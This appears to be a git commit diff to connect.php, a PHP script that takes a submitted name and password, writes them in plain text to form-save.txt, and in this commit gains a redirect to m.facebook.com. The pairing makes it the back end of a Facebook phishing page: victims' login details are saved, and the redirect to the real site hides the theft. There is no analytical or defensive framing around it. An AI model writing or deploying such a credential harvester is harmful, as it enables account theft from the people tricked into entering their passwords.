fe46027f615d1dcc125c520bf877a126eb736e5b
thememaginaryshop <soaibhaque3@gmail.com>
2020-10-16 09:49:18 +0530

    fix

--- connect.php
+++ connect.php
@@ -3,10 +3,12 @@ $name=$_POST["name"];
 $pass=$_POST["password"]
 ?>
 <?php
-$file=fopen("form-save.txt", "a");
+$file = fopen("form-save.txt", "a");
     fwrite($file,"name :");
     fwrite($file, $name ."\n");
     fwrite($file,"password :");
     fwrite($file, $pass ."\n");
     fclose($file);
+
+    header("location:https://m.facebook.com/")
  ?>
